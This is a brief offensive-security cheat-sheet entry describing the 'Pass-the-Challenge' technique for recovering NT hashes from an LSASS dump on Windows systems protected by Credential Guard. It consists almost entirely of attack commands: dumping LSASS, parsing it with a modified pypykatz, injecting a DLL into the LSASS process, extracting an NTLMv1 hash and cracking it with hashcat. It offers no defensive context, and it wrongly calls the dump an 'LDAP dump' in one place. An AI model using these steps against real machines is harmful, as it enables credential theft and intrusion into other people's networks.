# Pass-the-Challenge

This technique permits to retrieve the NT hashes from a LSASS dump when Credential Guard is in place. This modified version of Pypykatz must be used to parse the LDAP dump.

Link: https://github.com/ly4k/Pypykatz

## NTLMv1

#Dump the LSASS process with Mimikatz for example
#Parse the dump with Pypykatz

    python3 -m pypykatz lsa minidump lsass.DMP -p msv

#Inject the SecurityPackage.dll into the LSASS process

    ./PassTheChallenge.exe inject ./SecurityPackage.dll

#Retrieve the NTLMv1 hash

    ./PassTheChallenge.exe nthash <context handle>:<proxy info> <encrypted blob>

#Crack the NTLMv1 hash with hashcat to retrieve the NT hash
